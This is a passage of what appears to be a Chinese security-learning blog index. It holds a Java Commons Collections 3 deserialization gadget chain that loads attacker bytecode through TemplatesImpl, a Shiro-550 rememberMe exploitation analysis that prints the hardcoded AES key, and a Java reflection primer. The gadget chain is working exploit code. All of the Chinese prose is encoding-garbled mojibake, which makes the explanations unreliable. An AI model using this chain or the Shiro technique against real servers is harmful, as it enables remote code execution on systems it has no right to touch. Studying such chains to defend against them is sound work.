org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line">import javax.xml.transform.Templates;</span><br><span class="line">import java.io.*;</span><br><span class="line">import java.lang.reflect.Constructor;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.lang.reflect.InvocationHandler;</span><br><span class="line">import java.lang.reflect.Proxy;</span><br><span class="line">import java.nio.file.Files;</span><br><span class="line">import java.nio.file.Paths;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class CC3 &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception&#123;</span><br><span class="line">        TemplatesImpl templates = new TemplatesImpl();</span><br><span class="line">        Class tc = templates.getClass();</span><br><span class="line">        Field nameField = tc.getDeclaredField(&quot;_name&quot;);</span><br><span class="line">        nameField.setAccessible(true);</span><br><span class="line">        nameField.set(templates,&quot;aaa&quot;);</span><br><span class="line">        Field bytecodes  = tc.getDeclaredField(&quot;_bytecodes&quot;);</span><br><span class="line">        bytecodes.setAccessible(true);</span><br><span class="line">        byte[] code = Files.readAllBytes(Paths.get(&quot;D:\\text\\class\\text.class&quot;));</span><br><span class="line">        byte[][] codes = &#123;code&#125;;</span><br><span class="line">        bytecodes.set(templates,codes);</span><br><span class="line">//        Field tfactoryField = tc.getDeclaredField(&quot;_tfactory&quot;);</span><br><span class="line">//        tfactoryField.setAccessible(true);</span><br><span class="line">//        tfactoryField.set(templates,new TransformerFactoryImpl());</span><br><span class="line">//        templates.newTransformer();</span><br><span class="line"></span><br><span class="line">//        Transformer[] transformers = new Transformer[]&#123;</span><br><span class="line">//                new ConstantTransformer(templates),</span><br><span class="line">//                new InvokerTransformer(&quot;newTransformer&quot;, null,null)</span><br><span class="line">//        &#125;;</span><br><span class="line"></span><br><span class="line">        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]&#123;Templates.class&#125;,new Object[]&#123;templates&#125;);</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = new Transformer[]&#123;</span><br><span class="line">                new ConstantTransformer(TrAXFilter.class),</span><br><span class="line">                instantiateTransformer</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span><br><span class="line">//        chainedTransformer.transform(1);</span><br><span class="line"></span><br><span class="line">        Map&lt;Object, Object&gt; hashMap = new HashMap&lt;Object, Object&gt;();</span><br><span class="line">        Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(hashMap,chainedTransformer);</span><br><span class="line">        Class c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class="line">        Constructor constructor = c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        constructor.setAccessible(true);</span><br><span class="line">        InvocationHandler h = (InvocationHandler) constructor.newInstance(Override.class, lazyMap);</span><br><span class="line"></span><br><span class="line">        Map proxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),new Class[]&#123;Map.class&#125;,h);</span><br><span class="line">        Object o = constructor.newInstance(Override.class,proxy);</span><br><span class="line"></span><br><span class="line">//        serialize(o);</span><br><span class="line">        unserialize(&quot;ser.bin&quot;);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    public static void serialize(Object obj) throws IOException &#123;</span><br><span class="line">        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException &#123;</span><br><span class="line">        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));</span><br><span class="line">        Object obj = ois.readObject();</span><br><span class="line">        return obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><a target="_blank" rel="noopener" href="https://www.yongsheng.site/2022/01/30/CommonsCollections-3/">å‚è€ƒ</a></p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2022/06/17/shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">shiro550ååºåˆ—åŒ–æ¼æ´åˆ†æ</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2022-06-17</time><div class="content"><h2 id="shiroç®€ä»‹"><a href="#shiroç®€ä»‹" class="headerlink" title="shiroç®€ä»‹"></a>shiroç®€ä»‹</h2><p>Apache Shiroæ˜¯ä¸€ç§åŠŸèƒ½å¼ºå¤§ä¸”æ˜“äºä½¿ç”¨çš„Javaå®‰å…¨æ¡†æ¶ï¼Œå®ƒæ‰§è¡Œèº«ä»½éªŒè¯ã€æˆæƒã€åŠ å¯†å’Œä¼šè¯ç®¡ç†ï¼Œå¯ç”¨äºä¿æŠ¤ä»»ä½•åº”ç”¨ç¨‹åºçš„å®‰å…¨ã€‚</p>
<p>Shiroæä¾›äº†åº”ç”¨ç¨‹åºå®‰å…¨æ€§APIæ¥æ‰§è¡Œä»¥ä¸‹æ–¹é¢ï¼š</p>
<p>èº«ä»½éªŒè¯ï¼šè¯æ˜ç”¨æˆ·èº«ä»½ï¼Œé€šå¸¸ç§°ä¸ºç”¨æˆ·ç™»å½•</p>
<p>æˆæƒï¼šè®¿é—®æ§åˆ¶</p>
<p>å¯†ç æœ¯ï¼šä¿æŠ¤æˆ–éšè—æ•°æ®ä»¥é˜²çª¥è§†ï¼›</p>
<p>ä¼šè¯ç®¡ç†ï¼šæ¯ä¸ªç”¨æˆ·çš„æ—¶é—´æ•æ„ŸçŠ¶æ€ã€‚</p>
<p>Shiroè¿˜æ”¯æŒä¸€äº›è¾…åŠ©åŠŸèƒ½ï¼Œä¾‹å¦‚Webåº”ç”¨ç¨‹åºå®‰å…¨æ€§ï¼Œå•å…ƒæµ‹è¯•å’Œå¤šçº¿ç¨‹æ”¯æŒï¼Œå®ƒä»¬çš„å­˜åœ¨ä¹Ÿæ˜¯ä¸ºäº†åŠ å¼ºä¸Šè¿°å››ä¸ªæ–¹é¢ã€‚</p>
<h2 id="æ¼æ´ç®€ä»‹"><a href="#æ¼æ´ç®€ä»‹" class="headerlink" title="æ¼æ´ç®€ä»‹"></a>æ¼æ´ç®€ä»‹</h2><p>å½“ shiro ç‰ˆæœ¬ &lt;1.2.5æ—¶ï¼Œä¸»è¦æ˜¯ç”±shiro çš„ rememberMe å†…å®¹ ååºåˆ—åŒ– å¯¼è‡´çš„å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼Œé€ æˆçš„åŸå› æ˜¯ AESå¯†é’¥è¢«ç¡¬ç¼–ç åœ¨shiroæºç ä¸­ï¼Œè¿™å°±å¯¼è‡´äº†å¯ä»¥é€šè¿‡åœ¨cookieçš„rememberMeå­—æ®µæ’å…¥payloadå®ç°ä»»æ„ä»£ç æ‰§è¡Œ</p>
<p>åœ¨æˆ‘ä»¬å‹¾é€‰remembermeç™»é™†åï¼Œåˆ·æ–°ï¼ŒæŠ“åŒ…ï¼Œå°†å…¶ JSESSIONID åˆ é™¤ï¼Œä½¿ shiro éªŒè¯cookieä¸­remembermeçš„å€¼æ˜¯å¦æ­£ç¡®ï¼ˆå¦‚æœä¸åˆ é™¤JSESSIONIDï¼Œshiroåˆ™ç›´æ¥ä»¥JSESSIONIDä¸ºç™»é™†å‡­è¯äº†ï¼Œå°±ä¸ä¼šéªŒè¯remembermeä¸­çš„å€¼äº†ï¼‰</p>
<p>ç®€å•ä»‹ç»åˆ©ç”¨ï¼š<br>é€šè¿‡åœ¨cookieçš„rememberMeå­—æ®µä¸­æ’å…¥æ¶æ„payloadï¼Œ<br>è§¦å‘shiroæ¡†æ¶çš„rememberMeçš„ååºåˆ—åŒ–åŠŸèƒ½ï¼Œå¯¼è‡´ä»»æ„ä»£ç æ‰§è¡Œã€‚<br>shiro 1.2.24ä¸­ï¼Œæä¾›äº†ç¡¬ç¼–ç çš„AESå¯†é’¥ï¼škPH+bIxk5D2deZiIxcaaaA==<br>ç”±äºå¼€å‘äººå‘˜æœªä¿®æ”¹AESå¯†é’¥è€Œç›´æ¥ä½¿ç”¨Shiroæ¡†æ¶ï¼Œå¯¼è‡´äº†è¯¥é—®é¢˜</p>
<h2 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h2><p>ç¼–è¾‘å™¨ï¼šIDEA 2021<br>javaç‰ˆæœ¬ï¼šjdk8u65<br>Serverç‰ˆæœ¬ : Tomcat 8.5.81<br>shiroç‰ˆæœ¬ï¼šshiro-root-1.2.4<br><a target="_blank" rel="noopener" href="https://codeload.github.com/apache/shiro/zip/shiro-root-1.2.4">shiroç¯å¢ƒæ­å»º</a><br>tomcatå®˜ç½‘ä¸‹è½½å³å¯</p>
<h2 id="shiroå¯¼å…¥"><a href="#shiroå¯¼å…¥" class="headerlink" title="shiroå¯¼å…¥"></a>shiroå¯¼å…¥</h2><p>ä¸‹è½½å¥½ä»¥åç›´æ¥è§£å‹<br>ç„¶åå·å·çš„è¿›å…¥samples/webç›®å½•ï¼Œç›´æ¥ä¿®æ”¹pomæ–‡ä»¶ï¼Œä¸»è¦ä¿®æ”¹ä¸‹é¢è¿™äº›</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">&lt;dependencies&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;javax.servlet&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;jstl&lt;/artifactId&gt;</span><br><span class="line">        &lt;!--  è¿™é‡Œéœ€è¦å°†jstlè®¾ç½®ä¸º<span class="number">1.2</span> --&gt;</span><br><span class="line">        &lt;version&gt;<span class="number">1.2</span>&lt;/version&gt;</span><br><span class="line">        &lt;scope&gt;runtime&lt;/scope&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">.....</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;commons-collections4&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;<span class="number">4.0</span>&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">&lt;dependencies&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="tomcatå¯¼å…¥"><a href="#tomcatå¯¼å…¥" class="headerlink" title="tomcatå¯¼å…¥"></a>tomcatå¯¼å…¥</h3><p><img src="https://img-blog.csdnimg.cn/156750a0756b447485c57dbdee736246.png"></p>
<h3 id="waråŒ…å¯¼å…¥"><a href="#waråŒ…å¯¼å…¥" class="headerlink" title="waråŒ…å¯¼å…¥"></a>waråŒ…å¯¼å…¥</h3><p><img src="https://img-blog.csdnimg.cn/e425712ecc704a33bb2c21483f562568.png"></p>
<h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><h3 id="åŠ å¯†æ–¹å¼"><a href="#åŠ å¯†æ–¹å¼" class="headerlink" title="åŠ å¯†æ–¹å¼"></a>åŠ å¯†æ–¹å¼</h3><p>æˆ‘ä»¬è¦ç ”ç©¶çš„æ˜¯å¼€å¯RememberMeåç™»å½•çš„è¿‡ç¨‹ï¼Œæ‰€ä»¥ä»org.apache.shiro.mgt.AbstractRememberMeManager#onSuccessfulLoginå¤„å¼€å§‹å³å¯ï¼Œè¿™é‡Œæ˜¯åˆ¤æ–­æ˜¯å¦å¼€å¯RememberMeç„¶åå¼€å§‹æ“ä½œçš„åœ°æ–¹<br><img src="https://img-blog.csdnimg.cn/ab003e68b1194cdab5a631a992685e08.png"><br>è¿™é‡Œå…ˆæ¸…é™¤è®¤è¯ä¿¡æ¯ï¼Œç„¶åé€šè¿‡isRememberMe()åˆ¤æ–­æ˜¯å¦æœ‰è®¤è¯ä¿¡æ¯ï¼Œä¹Ÿå°±æ˜¯æ˜¯å¦å¼€å¯äº†RememberMeé€‰é¡¹æ¡†ï¼Œè·Ÿè¿›rememberIdentity()æ–¹æ³•<br><img src="https://img-blog.csdnimg.cn/218e474555fd4829a6aa38432e486991.png"><br>é¦–å…ˆè°ƒç”¨getIdentityToRememberå‡½æ•°æ¥è·å–ç”¨æˆ·èº«ä»½(ç”¨æˆ·root)ï¼Œæ¥ç€è·Ÿè¿›rememberIdentityæ„é€ æ–¹æ³•<br><img src="https://img-blog.csdnimg.cn/020f0e15d8c84698985b62911dccc7b2.png"><br>å…¶å®convertPrincipalsToBytesæ–¹æ³•å°†accountPrincipalsï¼ˆä¹Ÿå°±æ˜¯ç”¨æˆ·root)è½¬æ¢ä¸ºå­—èŠ‚å½¢å¼ï¼Œæˆ‘ä»¬å¯ä»¥è·Ÿè¿›ç ”ç©¶ä¸€ä¸‹<br><img src="https://img-blog.csdnimg.cn/ef4dc6a1fe8f40ff9c2b41903ef9b645.png"><br>è¿™é‡Œå°†Principals(ç”¨æˆ·root)åºåˆ—è¯åè¿›è¡ŒencryptåŠ å¯†ï¼Œè·Ÿè¿›encryptå‡½æ•°<br><img src="https://img-blog.csdnimg.cn/a4d182e34b6a46a1afcbf9b26674f9ed.png"><br>å…·ä½“æ€ä¹ˆåˆ†æåŠ å¯†ï¼Œä»–ä¸è§£å¯†æ—¶ä¸€æ ·ï¼Œè¿™é‡Œä¸åœ¨åˆ†æ<br>åŠ å¯†å®Œæˆåæˆ‘ä»¬ç»§ç»­è¿”å›è·Ÿè¿›rememberSerializedIdentity<br><img src="https://img-blog.csdnimg.cn/8f8830585343417088be4c6a7fff7bf5.png"><br>base64ç¼–ç åï¼Œè®¾ç½®åˆ°cookieä¸­ï¼Œå…¶å®åˆ°è¿™é‡Œå°±æ˜¯å­˜å…¥çš„å…¨éƒ¨æµç¨‹ï¼Œåºåˆ—åŒ–â€”&gt;AESåŠ å¯†â€”&gt;base64ç¼–ç â€”&gt;è®¾ç½®åˆ°cookieä¸­çš„remembermeå­—æ®µã€‚</p>
<h3 id="è§£å¯†æ–¹å¼"><a href="#è§£å¯†æ–¹å¼" class="headerlink" title="è§£å¯†æ–¹å¼"></a>è§£å¯†æ–¹å¼</h3><p>åˆ©ç”¨è´¦å·å¯†ç ç™»å½•ï¼Œæ‰¾åˆ°getRememberedSerializedIdentity()å‡½æ•°<br>æ ¹æ®è¯¥å‡½æ•°åç§°è¿™ä¸ªå‡½æ•°æ˜¯å¾—åˆ°ååºåˆ—åŒ–ä¹‹åçš„cookieå€¼çš„å‡½æ•°<br><img src="https://img-blog.csdnimg.cn/dc4ba7241dda4215b2d4b6b632a9e2d8.png"><br>æ‰¾åˆ°è°ƒç”¨è¿™ä¸ªå‡½æ•°çš„å‡½æ•°getRememberedPrincipals()<br><img src="https://img-blog.csdnimg.cn/b651165dd2ba45bf93b63109d874ee15.png"><br>å‘ç°å¦‚æœbyteä¸ä¸ºç©ºåˆ™è¿›å…¥convertBytesToPrincipalså‡½æ•°ï¼Œè·Ÿè¿›<br><img src="https://img-blog.csdnimg.cn/e89d5b2c3d9b4fb097bcc1472fabc114.png"><br>è¿”ç°å…¶å…ˆè§£å¯†åœ¨è¿›è¡Œååºåˆ—åŒ–<br>è·Ÿè¿›è§£å¯†ï¼ˆè¿™é‡Œè·Ÿè¿›äº†å‡ æ¬¡ï¼‰<br><img src="https://img-blog.csdnimg.cn/f2a6700ad3884ee2bf2618371478b742.png"><br>å‘ç°å‚æ•°å­˜åœ¨å¯†æ–‡å’Œkeyï¼Œæ¨æµ‹æ˜¯å¯¹ç§°å¯†é’¥ï¼Œä¹‹ååœ¨è·Ÿè¿›å‘ç°ä¸ºaesç®—æ³•ï¼Œkeyä¸ºå›ºå®šçš„å¯†é’¥<br><img src="https://img-blog.csdnimg.cn/e6a8c93460974aeaa2dcbfdca7b4fb8a.png"><br>è·Ÿè¿›åºåˆ—åŒ–å‘ç°å­˜åœ¨readObjectï¼Œåˆ¤æ–­åªè¦å­˜åœ¨commons collectionsæ‹“å±•ï¼Œæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨ccé“¾è¿›è¡Œæ¼æ´åˆ©ç”¨<br><img src="https://img-blog.csdnimg.cn/48c641a4ebd14836b34317d229a20d9e.png"><br>è§£å¯†çš„æµç¨‹åˆ°è¿™å°±ç»“æŸäº†ï¼Œè¯»å–cookieä¸­çš„rememberMeâ€”&gt;base64è§£ç â€”&gt;AESè§£å¯†â€”&gt;ååºåˆ—åŒ–</p>
<h2 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h2><p>ï¼ˆåœ¨å®æˆ˜ä¸­ä¸€èˆ¬æˆ‘ä»¬æ— æ³•è¾ƒå¥½çš„åˆ©ç”¨ccï¼Œä»…èƒ½è¾ƒå¥½çš„åˆ©ç”¨cbï¼‰<br>åˆ©ç”¨å°±æ˜¯æ”¹rememberMeï¼Œæˆ‘ä»¬å¯ä»¥å°†æˆ‘ä»¬æ„é€ çš„payloadè¿›è¡ŒaesåŠ å¯†åœ¨ä¼ é€’ï¼Œåœ¨ä¼ é€’æ—¶ï¼Œä¸€å®šè¦å°† JSESSIONIDåˆ é™¤ï¼Œå…·ä½“aesåŠ å¯†å°±ä¸å†æ¼”ç¤º</p>
<p>Shiroååºåˆ—åŒ–æ¼æ´ç›®å‰ä¸ºæ­¢æœ‰ä¸¤ä¸ªï¼ŒShiro-550(Apache Shiro &lt; 1.2.5)å’Œ Shiro-721( Apache Shiro &lt; 1.4.2 )</p>
<p>ä¸»è¦åŒºåˆ«åœ¨äº</p>
<blockquote>
<p>Shiro550ä½¿ç”¨å·²çŸ¥å¯†é’¥æ’</p>
<p>Shiro721æ˜¯ä½¿ç”¨ç™»å½•årememberMe={value}å»çˆ†ç ´æ­£ç¡®çš„keyå€¼è¿›è€Œååºåˆ—åŒ–ï¼Œ</p>
<p>å¯¹æ¯”Shiro550æ¡ä»¶åªè¦æœ‰è¶³å¤Ÿå¯†é’¥åº“ï¼ˆæ¡ä»¶æ¯”è¾ƒä½ï¼‰ã€Shiro721éœ€è¦ç™»å½•ï¼ˆè¦æ±‚æ¯”è¾ƒé«˜é¸¡è‚‹ï¼‰</p>
<p>Apache Shiro &lt; 1.4.2é»˜è®¤ä½¿ç”¨AES/CBC/PKCS5Paddingæ¨¡å¼</p>
<p>Apache Shiro &gt;= 1.4.2é»˜è®¤ä½¿ç”¨AES/GCM/PKCS5Paddingæ¨¡å¼</p>
</blockquote>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Yang34/p/14122843.html">å¤§ä½¬åšå®¢</a></p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2022/06/07/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0(%E4%B8%80%EF%BC%89/">Javaååºåˆ—åŒ–å­¦ä¹ ï¼ˆä¸€ï¼‰</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2022-06-07</time><div class="content"><h2 id="Javaåå°„"><a href="#Javaåå°„" class="headerlink" title="Javaåå°„"></a>Javaåå°„</h2><p>åå°„ä¾‹å­</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> test;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="comment">//æˆ–å–å®ä¾‹åŒ–å¯¹è±¡</span></span><br><span class="line">        person a = <span class="keyword">new</span> person();</span><br><span class="line">        Class c = a.getClass();</span><br><span class="line">        Constructor personcConstructor = c.getConstructor(String.class,<span class="keyword">int</span>.class);</span><br><span class="line">        <span class="comment">//getConstructor()æ–¹æ³•ç”¨äºè¿”å›ä¸€ä¸ªConstructorå¯¹è±¡ï¼Œè¯¥å¯¹è±¡åæ˜ æ­¤Classå¯¹è±¡è¡¨ç¤ºçš„ç±»çš„ç»™å®šå…¬å…±æ„é€ æ–¹æ³•</span></span><br><span class="line">        person p = (person) personcConstructor.newInstance(<span class="string">&quot;abc&quot;</span>,<span class="number">21</span>);</span><br><span class="line">        <span class="comment">// System.out.println(p);</span></span><br><span class="line">        <span class="comment">//æˆ–å–ç±»ä¸­å±æ€§</span></span><br><span class="line">        <span class="comment">// Field [] personFields = c.getDeclaredFields();</span></span><br><span class="line">        <span class="comment">// for(Field f:personFields)&#123;</span></span><br><span class="line">        <span class="comment">//     System.out.println(f);</span></span><br><span class="line">        <span class="comment">// &#125;</span></span><br><span class="line">        <span class="comment">// Field namefield = c.getField(&quot;name&quot;);</span></span><br><span class="line">        <span class="comment">// namefield.set(p,&quot;xinxin&quot;);</span></span><br><span class="line">        <span class="comment">// System.out.println(p);</span></span><br><span class="line">        <span class="comment">//è°ƒç”¨åå°„é‡Œé¢çš„æ–¹æ³•</span></span><br><span class="line">        <span class="comment">// Method[] personMethods = c.getMethods();</span></span><br><span class="line">        <span class="comment">// for(Method f:personMethods)&#123;</span></span><br><span class="line">        <span class="comment">//     System.out.println(f);</span></span><br><span class="line">        <span class="comment">// &#125;</span></span><br><span class="line">        Method actionmethod = c.getDeclaredMethod(<span class="string">&quot;action&quot;</span>, String.class);</span><br><span class="line">        actionmethod.setAccessible(<span class="keyword">true</span>);<span class="comment">//ä¿®æ”¹æƒé™</span></span><br><span class="line">        actionmethod.invoke(p,<span class="string">&quot;sssss&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¯¦ç»†ä»‹ç»</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/yepei/p/5649276.html#:~:text=Class%20%E7%B1%BB%E6%98%AF%E5%9C%A8Java%E8%AF%AD%E8%A8%80%E4%B8%AD%E5%AE%9A%E4%B9%89%E4%B8%80%E4%B8%AA%E7%89%B9%E5%AE%9A%E7%B1%BB%E7%9A%84%E5%AE%9E%E7%8E%B0%E3%80%82%20%E4%B8%80%E4%B8%AA%E7%B1%BB%E7%9A%84%E5%AE%9A%E4%B9%89%E5%8C%85%E5%90%AB%E6%88%90%E5%91%98%E5%8F%98%E9%87%8F%EF%BC%8C%E6%88%90%E5%91%98%E6%96%B9%E6%B3%95%EF%BC%8C%E8%BF%98%E6%9C%89%E8%BF%99%E4%B8%AA%E7%B1%BB%E5%AE%9E%E7%8E%B0%E7%9A%84%E6%8E%A5%E5%8F%A3%EF%BC%8C%E4%BB%A5%E5%8F%8A%E8%BF%99%E4%B8%AA%E7%B1%BB%E7%9A%84%E7%88%B6%E7%B1%BB%E3%80%82%20Class%E7%B1%BB%E7%9A%84%E5%AF%B9%E8%B1%A1%E7%94%A8%E4%BA%8E%E8%A1%A8%E7%A4%BA%E5%BD%93%E5%89%8D%E8%BF%90%E8%A1%8C%E7%9A%84%20Java,%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E4%B8%AD%E7%9A%84%E7%B1%BB%E5%92%8C%E6%8E%A5%E5%8F%A3%E3%80%82%20%E6%AF%94%E5%A6%82%EF%BC%9A%E6%AF%8F%E4%B8%AA%E6%95%B0%E7%BB%84%E5%9D%87%E5%B1%9E%E4%BA%8E%E4%B8%80%E4%B8%AA%20Class%20%E7%B1%BB%E5%AF%B9%E8%B1%A1%EF%BC%8C%E6%89%80%E6%9C%89%E5%85%B7%E6%9C%89%E7%9B%B8%E5%90%8C%E5%85%83%E7%B4%A0%E7%B1%BB%E5%9E%8B%E5%92%8C%E7%BB%B4%E6%95%B0%E7%9A%84%E6%95%B0%E7%BB%84%E5%85%B1%E4%BA%AB%E4%B8%80%E4%B8%AAClass%20%E5%AF%B9%E8%B1%A1%E3%80%82">Classç±»</a></p>
<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/86293659">Java åå°„æœºåˆ¶</a></p>
<h2 id="Javaååºåˆ—åŒ–"><a href="#Javaååºåˆ—åŒ–" class="headerlink" title="Javaååºåˆ—åŒ–"></a>Javaååºåˆ—åŒ–</h2><h4 id="å¯ç”¨å½¢å¼"><a href="#å¯ç”¨å½¢å¼" class="headerlink" title="å¯ç”¨å½¢å¼"></a>å¯ç”¨å½¢å¼</h4><p>1ã€å…¥å£ç±»çš„readObjectç›´æ¥è°ƒç”¨å±é™©å‡½æ•°</p>
<p>2ã€å…¥å£ç±»å‚æ•°ä¸­åŒ…å«å¯æ§ç±»ï¼Œè¯¥å¯æ§ç±»æœ‰å±é™©æ–¹æ³•ï¼ŒreadObjectæ—¶è°ƒç”¨</p>
<p>è¿‡ç¨‹ï¼šå…¥å£Aï¼ˆhashmapï¼‰æ¥æ”¶å‚æ•°Oï¼ˆurldnsé“¾å­ï¼‰</p>
<p>â€‹            è¦åˆ©ç”¨çš„ç±» (URL)</p>
<p>â€‹            ç›®æ ‡è°ƒç”¨B.fï¼ˆfä¸ºhashcodeï¼‰</p>
<p>â€‹            å½“A.readObject-&gt;O.f-(ç”±äºä¼ å…¥çš„æ˜¯URL)&gt;B.f</p>
<p>â€‹            ä»è€Œè°ƒç”¨â€œå±é™©â€å‡½æ•°ï¼ˆhashcodeï¼‰</p>
<p>3ã€å…¥å£å‚æ•°ä¸­åŒ…å«å¯æ§ç±»ï¼Œè¯¥ç±»æœ‰è°ƒç”¨å…¶ä»–å±é™©æ–¹æ³•çš„ç±»ï¼ŒreadObjectæ—¶è°ƒç”¨</p>
<p>â€‹    <strong>æœ‰æ—¶åœ¨ååºåˆ—åŒ–æ¼æ´ä¸­çš„åº”ç”¨</strong></p>
<p>â€‹            å®šåˆ¶éœ€è¦çš„å¯¹è±¡</p>
<p>â€‹            é€šè¿‡invokeè°ƒç”¨é™¤äº†åŒåå‡½æ•°ä»¥å¤–çš„å‡½æ•°</p>
<p>â€‹            é€šè¿‡Classç±»åˆ›å»ºå¯¹è±¡ï¼Œå¼•ç”¨ä¸èƒ½åºåˆ—åŒ–çš„ç±»</p>
<p>åŠ¨æ€ä»£ç†ä¸ç®¡ä¼ é€’çš„å‚æ•°æ˜¯ä»€ä¹ˆæ€»ä¼šè°ƒç”¨invokeç±»</p>
<p>javaå‘½ä»¤æ‰§è¡Œ</p>
<p> Runtime.getRuntime().exec(â€œcalcâ€)</p>
<h2 id="åŠ¨æ€ä»£ç†"><a href="#åŠ¨æ€ä»£ç†" class="headerlink" title="åŠ¨æ€ä»£ç†"></a>åŠ¨æ€ä»£ç†</h2><p>åœ¨ä¸ä¿®æ”¹åŸæœ‰ç±»çš„æƒ…å†µä¸‹å¢åŠ åŠŸèƒ½ã€‚</p>
<p>åœ¨ååºåˆ—åŒ–æ¼æ´çš„ä½œç”¨ï¼š</p>
<p>readObject-&gt;ååºåˆ—åŒ–è‡ªåŠ¨æ‰§è¡Œ</p>
<p>invoke-&gt;æœ‰å‡½æ•°è°ƒç”¨</p>
<p>ä¸»è¦ä»£ç </p>
<p>test.java</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> test;</span><br><span class="line"><span class="comment">//import java.io.ObjectInputStream.GetField;</span></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span 